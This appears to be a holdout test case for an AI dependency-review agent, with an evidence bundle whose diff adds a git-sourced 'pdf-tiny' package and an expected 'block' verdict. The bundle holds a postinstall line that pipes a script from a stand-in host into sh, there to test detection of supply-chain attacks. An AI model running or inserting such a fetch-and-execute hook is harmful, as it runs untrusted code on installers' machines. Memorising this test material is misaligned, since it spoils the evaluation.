---
description: "A new dependency fetched from a git URL whose install script downloads and runs code is blocking."
tags: [role:dependency-reviewer, expect:block, target:fixture, holdout]
runs: 1
model: sonnet
max_turns: 4
timeout_seconds: 600
allowed_tools: [Agent]
---

Dispatch the `software-factory:dependency-reviewer` agent once, in the foreground, with the request below as its whole prompt, copied verbatim, and wait for its answer. Do not do the agent's work yourself and do not add advice of your own.

When the agent has answered, end your reply with exactly one line: `RESULT: <n>`, the number of findings the agent marked `blocking`.

<request>
Review the change in this evidence bundle. The bundle's files are inlined below instead of given as a path; there is no checkout to read. Return your review as JSON with `findings` and `summary`. Each finding has id (F-n), severity (blocking, major, minor or nit), category (correctness, security, test_adequacy, maintainability, dependency, migration, ux or spec_compliance), file, line, title, failure_scenario, fix and confidence (0-100).

<spec.yaml>
objective: render order receipts as PDF
scope: {include: [src/receipts/, test/, package.json, pnpm-lock.yaml], exclude: []}
acceptance_criteria:
  - {id: AC-1, statement: "renderReceipt(order) returns a PDF buffer that starts with %PDF", verification: "node --test test/receipt.test.ts"}
invariants: ["dependencies come from the registry, pinned to exact versions"]
</spec.yaml>

<diff.patch>
--- a/package.json
+++ b/package.json
@@ -6,7 +6,8 @@
   "type": "module",
   "dependencies": {
-    "zod": "4.1.12"
+    "zod": "4.1.12",
+    "pdf-tiny": "github:pdf-tiny-dev/pdf-tiny#main"
   }
 }
--- a/pnpm-lock.yaml
+++ b/pnpm-lock.yaml
@@ -9,6 +9,9 @@ importers:
     dependencies:
+      pdf-tiny:
+        specifier: github:pdf-tiny-dev/pdf-tiny#main
+        version: https://codeload.github.com/pdf-tiny-dev/pdf-tiny/tar.gz/5f1c2e0
       zod:
         specifier: 4.1.12
         version: 4.1.12
--- /dev/null
+++ b/vendor-notes/pdf-tiny-package.json
@@ -0,0 +1,7 @@
+{
+  "name": "pdf-tiny",
+  "version": "0.0.3",
+  "scripts": {
+    "postinstall": "curl -fsSL https://pdf-tiny.example/setup.sh | sh"
+  }
+}
--- /dev/null
+++ b/src/receipts/render.ts
@@ -0,0 +1,5 @@
+import { pdf } from "pdf-tiny";
+
+export function renderReceipt(order: { id: string; cents: number }): Buffer {
+  return pdf(`Order ${order.id}: ${(order.cents / 100).toFixed(2)}`);
+}
</diff.patch>

<gates.json summary>
typecheck pass, lint pass, test pass, sast pass, secrets pass, deps pass (osv: no advisory for pdf-tiny)
</gates.json summary>
</request>
